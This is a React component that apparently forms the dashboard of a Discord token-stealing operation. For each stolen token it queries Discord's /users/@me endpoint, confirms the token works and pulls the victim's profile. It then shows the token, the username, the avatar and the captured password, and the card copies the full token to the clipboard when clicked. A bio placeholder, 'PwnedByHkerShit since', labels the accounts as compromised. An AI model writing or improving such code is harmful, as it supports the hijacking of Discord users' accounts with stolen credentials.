import { useState, useEffect } from 'react';
import axios from 'axios';
import dayjs from 'dayjs';

const GotTokens = ({token, date, password}) => {
	const [user, setUser] = useState(null);
	useEffect(() => {
		const fetchUsers = async () => {
			const tk = await axios.get('https://discord.com/api/v9/users/@me', {
				headers: {
					Authorization: token
				}
			});
			setUser(tk.data);

		}
		fetchUsers();
	}, [token]);

	const copyToken = (tk) => {
		navigator.clipboard.writeText(tk);
	}

	return (
		<>
		{
			user ? 
				<div className="token-card" onClick={() => copyToken(token)}>
					<span className="token-info">{token.slice(0, 30) + "..."}</span>
					<div className="token-card-header">
						<img
							alt={user.username + "#" + user.discriminator} 
							src={user.avatar ? 
								"https://cdn.discordapp.com/avatars/" + user.id + "/" + user.avatar 
								: "https://i.pinimg.com/736x/35/79/3b/35793b67607923a68d813a72185284fe.jpg"
							} 
						/>

					</div>
					<div className="token-card-body">
						<h3><span>{user.username}</span>#{user.discriminator}</h3>
						<p><span>$psw:</span> {password !== null ? password : "Nope"}</p>
						<hr />
						<p className="about-me">About me</p>
						<p>{user.bio ? user.bio : "PwnedByHkerShit since"}</p>
						<p>{dayjs(date).format("MM/DD/YYYY")}</p>
					</div>
				</div>
			: ""
		}
		</>
	)
}

export default GotTokens;